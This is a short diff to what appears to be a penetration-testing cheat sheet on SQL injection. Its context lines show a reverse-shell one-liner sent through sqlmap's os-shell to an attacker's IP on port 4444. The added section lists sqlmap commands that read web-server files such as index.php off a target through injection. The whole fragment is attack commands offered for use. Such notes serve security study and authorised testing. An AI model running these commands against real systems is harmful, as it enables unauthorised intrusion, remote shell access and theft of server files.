@@ -66,6 +66,18 @@ render_with_liquid: true
         os-shell> bash -c 'bash -i >& /dev/tcp/<your-local-ip>/4444 0>&1'
         ```
 
+    4. **Read File**
+
+        ```sh
+        # --batch: never ask for user input, use the default behavior
+        sqlmap -r request.txt --file-read "/var/www/html/index.php" --time-sec 10 --batch
+        sqlmap -r request.txt --file-read "/var/www/<subdomain>/index.php" --time-sec 10 --batch
+
+        sqlmap -u "http://<target-ip>/?q=test" --file-read "var/www/html/index.php" --time-sec 10 --batch
+        ```
+
+<br />
+
 ## Manual Injection
 
 1. **Comments**
